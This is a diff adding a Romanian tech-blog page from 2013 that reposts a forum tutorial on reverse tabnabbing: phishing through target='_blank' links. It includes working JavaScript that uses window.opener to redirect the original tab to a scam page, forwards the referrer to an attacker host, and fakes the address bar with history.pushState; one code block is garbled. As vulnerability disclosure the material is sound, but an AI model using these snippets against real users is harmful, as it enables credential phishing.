@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- Begin Jekyll SEO tag v2.4.0 -->
+<title>Phishing via target=”_blank” | Silviu Stroe’s Tech Blog</title>
+<meta name="generator" content="Jekyll v3.7.2" />
+<meta property="og:title" content="Phishing via target=”_blank”" />
+<meta name="author" content="Silviu Stroe" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Rasfoind astazi forumul RSTCenter.com, am vazut ca acest utilizator a “reinventat roata” intr-un mod foarte ingenios. Va prezint in continuare postarea lui de pe forum:" />
+<meta property="og:description" content="Rasfoind astazi forumul RSTCenter.com, am vazut ca acest utilizator a “reinventat roata” intr-un mod foarte ingenios. Va prezint in continuare postarea lui de pe forum:" />
+<link rel="canonical" href="http://localhost:4000/phishing-via-target_blank/" />
+<meta property="og:url" content="http://localhost:4000/phishing-via-target_blank/" />
+<meta property="og:site_name" content="Silviu Stroe’s Tech Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2013-01-06T22:23:49+02:00" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/phishing-via-target_blank/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/phishing-via-target_blank/"},"author":{"@type":"Person","name":"Silviu Stroe"},"description":"Rasfoind astazi forumul RSTCenter.com, am vazut ca acest utilizator a “reinventat roata” intr-un mod foarte ingenios. Va prezint in continuare postarea lui de pe forum:","@type":"BlogPosting","headline":"Phishing via target=”_blank”","dateModified":"2013-01-06T22:23:49+02:00","datePublished":"2013-01-06T22:23:49+02:00","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Silviu Stroe's Tech Blog" />
+  
+</head>
+
+
+  <body>
+
+    <header class="site-header" role="banner">
+
+    <div class="wrapper">
+
+        <a class="site-title" href="/">Silviu Stroe&#39;s Tech Blog</a>
+
+        <nav class="site-nav">
+      <span class="menu-icon">
+        <svg viewBox="0 0 18 15" width="18px" height="15px">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </span>
+
+            <div class="trigger">
+                <!--
+                    my_page.autogen is populated by the pagination logic for all pages
+                                    that are automatically created by the gem. Check for non-existence to exclude pagination pages from site.pages iterators
+                  -->
+
+                
+                
+                
+                
+                <a class="page-link" href="/despre-mine.html">About me [R0]</a>
+                
+                
+                
+                
+                
+                
+                
+                <a class="page-link" href="/index.html">Silviu Stroe&#39;s Tech Blog</a>
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+            </div>
+        </nav>
+
+    </div>
+
+</header>
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Phishing via target=”_blank”</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2013-01-06T22:23:49+02:00" itemprop="datePublished">
+        
+        Jan 6, 2013
+      </time>
+      
+        • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">Silviu Stroe</span></span>
+      </p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Rasfoind astazi forumul RSTCenter.com, am vazut ca acest utilizator a “reinventat roata” intr-un mod foarte ingenios. Va prezint in continuare postarea lui de pe forum:</p>
+
+<p>Autor: <a id="yui-gen21" title="B7ackAnge7z is online now" href="https://rstforums.com/forum/members/b7ackange7z/" rel="nofollow"><strong>B7ackAnge7z</strong></a></p>
+
+<p>Sper să nu greșesc dacă voi spune, că știm cu toții ce e un link și la ce folosește atributul target pentru tag-ul <a>. Și dat fiind faptul că majoritatea consideră inofensivă folosirea acestei tehnici atât de populare, în acest tutorial voi încerca să demonstrez contrariul.</a></p>
+
+<p>Pentru început vreau să menționez că ceea ce va fi descris aici, personal o consider a fiind o vulnerabilitate pentru toate browserele cu excepția… <em>ta-da!</em> — Internet Explorer. Iată de ce în continuare voi folosi cuvântul „vulnerabilitate” atunci când mă voi referi la acest „fenomen”.</p>
+
+<p>De asemenea, vă rog să atrageți atenția că această vulnerabilitate v-a funcționa perfect <span style="text-decoration: underline;">doar dacă</span>se va apăsa click de stânga pe link, și nu click de dreapta → „Deschide în filă nouă”.</p>
+
+<p>Și, nu în ultimul rând, așa cum toată lumea recomandă să fie folosit target=”_blank” pentru toate link-urile externe (doar nu dorim ca utilizatorul să părăsească pagina noastră), trebuie să constat că această vulnerabilitate afectează majoritatea site-urilor care fac referire la pagini externe.</p>
+
+<p><span style="font-size: large;"><b>Teorie</b></span></p>
+
+<p>Dacă avem pagina curentă „A” și facem referire la pagina „B” folosind atributul target=”_blank”, atunci când se va deschide pagina „B” pentru aceasta va fi creat un obiect window.opener cu ajutorului căruia putem redirecționa pagina „A” către o nouă pagină în timp ce utilizatorul accesează pagina „B”. Și cel mai important, paginile „A” și „B” pot fi pe domenii diferite.</p>
+
+<p><span style="font-size: large;"><b>Practică</b></span></p>
+
+<p>Pentru a înțelege mai bine despre ce merge vorba, vă recomand următorul exemplu: apăsați <a href="http://black.securrity.com/t_blank/rst-poc/" target="_blank" rel="nofollow">click aici</a>, așteptați să se încarce pagina, după care reveniți înapoi. Dacă apare eroarea „<em>window.opener is null</em>” atunci:</p>
+
+<ol>
+  <li>Ai deschis link-ul altfel decât folosind click de stânga;</li>
+  <li>Browserul tău nu e vulnerabil;</li>
+  <li>Magie neagră?</li>
+</ol>
+
+<p>Pentru un exemplu mai complex, vă rog să accesați <a href="http://white.securrity.com/t_blank/" target="_blank" rel="nofollow">această pagină</a> unde am folosit această vulnerabilitate pentru a simula un atac de tip phishing asupra unui site ce oferă servicii de email. Ca și pentru oricare site asemănător (Gmail, Hotmail ș.a.) fiecare link primit într-un mesaj are atributultarget=”_blank”.</p>
+
+<p><span style="font-size: large;"><b>Explicații</b></span></p>
+
+<p>Pentru a exploata vulnerabilitatea, trimitem un mesaj ce conține adresa URL către pagina „capcană”, unde pentru a fi siguri că utilizatorul a deschis link-ul, folosind click de stânga și nu altă metodă, verificăm dacă există obiectul window.opener și nu este NULL. După care, putem redirecționa pagina de unde a venit utilizatorul. Codul arată cam așa:</p>
+
+<div>
+  <div>
+    Code:
+  </div>
+  
+  <pre>if (window.opener) {
+   window.opener.location.replace('full-url-to-scam-page');
+}</pre>
+</div>
+
+<p>După cum puteți observa, totul e atât de simplu, atât de banal, atât de periculos… Dacă pagina de phishing și cea legitimă arată ca 2 picături de apă, iar numele domeniului nu dă de bănuit, când utilizatorul va reveni la pagina inițială cu siguranță, nu va observa modificarea.</p>
+
+<p>Pentru a da mai puțin de bănuit, poate fi modificată adresa URL pentru pagina de phishing în felul următor:</p>
+
+<ul>
+  <li>De pe pagina <strong>funny.php</strong> e nevoie să trimitem adresa URL (referrer) de unde a venit utilizatorul. Eu am făcut așa: &lt;div&gt;
+    <div>
+    Code:
+  </div>
+
+    <pre>var referrer = encodeURIComponent(document.referrer);
+window.opener.location = 'http://black.securrity.com/t_blank/scam.php#' + referrer;</pre>
+    <p>&lt;/div&gt;</p>
+  </li>
+  <li>Apoi, pe pagina <strong>scam.php</strong> am folosit următorul cod: &lt;div&gt;
+    <div>
+    Code:
+  </div>
+
+    <pre>// Extragem legătura adresei URL și eliminăm numele domeniului
+var fakeurl = decodeURIComponent(window.location.hash).replace('#http://white.securrity.com', '');
+
+</pre>
+  </li>
+</ul>
+<p>// Modificăm adresa URL fără a încărca conținutul acelei pagini
+window.history.pushState(false, false, fake_url);&lt;/pre&gt;
+    &lt;/div&gt;</p>
+
+<p><span style="font-size: large;"><b>În loc de concluzii</b></span></p>
+
+<p>Sincer, nu înțeleg, ce a fost în capul dezvoltatorilor ca să permită executarea funcțieilocation.replace() sau modificarea obiectului location dintre două domenii diferite? Dacă era de pe același domeniu, înțelegeam… Și chiar e foarte straniu, căci celelalte funcții și atribute ale obiectului window.opener nu pot nici măcar citite, deoarece:</p>
+
+<div>
+  <div>
+    <div>
+      <div>
+      </div>
+      
+      <div>
+        <img title="Quote" alt="Quote" src="https://rstforums.com/forum/elitex360/misc/quote_icon.png" /> Originally Posted by <strong>Firefox</strong>
+      </div>
+      
+      <div>
+        Error: Permission denied to access property ‘bla-bla-bla’
+      </div>
+    </div>
+  </div>
+</div>
+
+<p>Sursa: https://rstforums.com/forum/63056-phishing-via-target-_blank.rst</p>
+
+  </div>
+
+  
+
+  <a class="u-url" href="/phishing-via-target_blank/" hidden></a>
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Silviu Stroe&#39;s Tech Blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">
+            
+              Silviu Stroe&#39;s Tech Blog
+            
+            </li>
+            
+            <li><a class="u-email" href="mailto:contact [at] silviu-s.com">contact [at] silviu-s.com</a></li>
+            
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+  
+  
+  
+  <li><a href="https://github.com/s1lviu"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">s1lviu</span></a></li>
+  
+  
+  
+  <li><a href="https://www.twitter.com/silv1u"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">silv1u</span></a></li>
+  
+  
+  
+</ul>
+
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Silviu Bogdan Stroe - Full Stack Developer interested in technologies like PHP, NodeJS, My/PL/No/SQL, AngularJS, Ionic Framework, Laravel, Python, Unity/C# Also having experience with Unix - FreeBSD, Windows, Linux - Debian; NGiИX, Apache</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
